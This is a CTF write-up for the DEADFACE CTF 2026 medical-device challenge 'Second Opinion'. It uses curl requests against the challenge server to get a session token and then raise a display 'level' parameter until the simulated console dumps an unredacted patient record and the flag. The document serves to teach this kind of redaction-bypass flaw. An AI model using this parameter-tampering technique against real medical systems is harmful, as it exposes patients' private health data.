---
title: Second Opinion
tags:
  - DEADFACE CTF 2026
  - Medical Device
---

# Second Opinion

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Medical Device |
| **Points** | 50 |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) · Lyna |

## Challenge

The touchscreen shows the current patient redacted to initials and a masked record number. Even without a login, it may be possible to learn sensitive patient information. The maintenance ports aren't locked or covered. Use a tool from your toolkit.

## Solution

### 1. Plug in the HDMI cable

The HDMI hotspot says field engineers mirror the console to an external display. Connecting the HDMI cable returns a session token:

```bash
curl -s -X POST http://emedra.dctf.io:8080/api/connect \
  -H 'content-type: application/json' -d '{"tool":"hdmi","port":"hdmi"}'
```

```json
{"ok":true,"windowType":"external-display","token":"<TOKEN>"}
```

### 2. Raise the OSD level

The external display takes a `level` parameter. Level 0 still shows `G.M.` / `****13`, but the response hints "raise the diagnostic level for raw session output", and level 2 spells out the gate:

```
osd.verbosity=2  session.redaction=ON  raw_dump=locked (needs level 3)
```

So ask for level 3:

```bash
curl -s "http://emedra.dctf.io:8080/api/external-display?level=3" \
  -H "authorization: Bearer <TOKEN>"
```

```json
{"osdLevel":3,"raw":true,
 "patient":{"name":"Gideon Marsh","dob":"1981-10-31","mrn":"100413"},
 "study":"Cranial perfusion, contrast",
 "diagSession":"deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}"}
```

Level 3 is a raw session dump that bypasses the touchscreen's redaction entirely.

## Flag

!!! flag "Flag"
    `deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}`

## Takeaways

Redaction on the main screen means nothing if a debug video output renders the raw record. Any client-controlled "level" or "verbosity" parameter is worth walking up to its maximum.
